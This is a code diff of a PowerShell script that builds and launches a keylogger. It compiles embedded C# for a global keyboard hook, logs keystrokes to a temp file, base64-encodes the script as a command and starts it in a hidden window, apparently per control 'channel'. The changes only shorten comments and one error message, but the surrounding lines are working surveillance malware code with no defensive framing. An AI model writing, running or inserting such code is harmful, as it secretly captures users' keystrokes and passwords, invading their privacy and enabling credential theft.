@@ -6,17 +6,17 @@ $errorLog = "$env:TEMP\keylog_error_$channelID.txt"
 $pidFile = "$env:TEMP\keylog_pid_$channelID.txt"
 $readyFile = "$env:TEMP\keylog_ready_$channelID.txt"
 
-# Clean up any previous run files
+# Clean up previous run files
 Remove-Item $pidFile, $readyFile, $errorLog -Force -ErrorAction SilentlyContinue
 
-# Kill any previous keylogger process for this channel (by PID file)
+# Kill any previous keylogger process for this channel
 if (Test-Path $pidFile) {
     $oldPid = Get-Content $pidFile
     Stop-Process -Id $oldPid -Force -ErrorAction SilentlyContinue
     Remove-Item $pidFile -Force
 }
 
-# C# code for global keyboard hook with error handling
+# C# code for global keyboard hook
 $cSharpCode = @"
 using System;
 using System.Diagnostics;
@@ -38,7 +38,7 @@ public class Keylogger
         _logFile = logFile;
         _writer = new StreamWriter(logFile, true) { AutoFlush = true };
 
-        // Signal that the process has started (file created)
+        // Signal that the process has started
         string readyFile = Path.Combine(Path.GetTempPath(), "keylog_ready_" + Process.GetCurrentProcess().Id + ".txt");
         File.WriteAllText(readyFile, "ready");
 
@@ -110,7 +110,7 @@ $cSharpCode
 }
 "@
 
-# Encode the script as a command to avoid quoting issues
+# Encode the script as a command
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($psScript)
 $encodedCommand = [Convert]::ToBase64String($bytes)
 
@@ -122,7 +122,7 @@ $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
 $psi.CreateNoWindow = $true
 $p = [System.Diagnostics.Process]::Start($psi)
 
-# Wait for the ready file (max 5 seconds) to confirm successful start
+# Wait for the ready file (max 5 seconds)
 $timeout = 5
 $readyPath = "$env:TEMP\keylog_ready_$($p.Id).txt"
 while ($timeout -gt 0 -and -not (Test-Path $readyPath)) {
@@ -135,7 +135,7 @@ Remove-Item $readyPath -Force -ErrorAction SilentlyContinue
 if ($p.HasExited) {
     if (Test-Path $errorLog) {
         $errorMsg = Get-Content $errorLog -Raw
-        Write-Output "Keylogger failed to start. Check error log: $errorLog`n$errorMsg"
+        Write-Output "Keylogger failed to start. Compilation errors:`n$errorMsg"
         Remove-Item $errorLog -Force
     } else {
         Write-Output "Keylogger process exited unexpectedly with no error log."
